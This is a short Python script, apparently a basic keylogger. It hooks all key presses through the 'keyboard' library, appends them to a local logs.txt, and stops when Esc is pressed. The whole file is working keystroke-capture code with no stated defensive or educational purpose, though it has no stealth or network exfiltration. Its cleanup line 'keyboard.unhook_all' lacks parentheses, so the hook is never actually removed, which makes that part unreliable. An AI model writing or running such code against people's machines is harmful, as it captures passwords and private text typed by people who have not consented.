import keyboard
special_keys = ['tab', 'alt', 'shift', 'ctrl', 'caps_lock', 'space', 'enter', 'backspace', 'delete', 'arrow_up', 'arrow_down', 'arrow_left', 'arrow_right', 'home', 'end', 'page_up', 'page_down', 'insert', 'print_screen', 'num_lock', 'scroll_lock', 'pause']

def log_key(event):
    with open('logs.txt', 'a') as logFile:
        if event.name in special_keys: 
            logFile.write(f"\n{event.name}\n")
        else:
            logFile.write(event.name)

def start_logging_keyboard(): 
    keyboard.on_press(log_key)
    try:
        keyboard.wait('esc')
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all
        
start_logging_keyboard()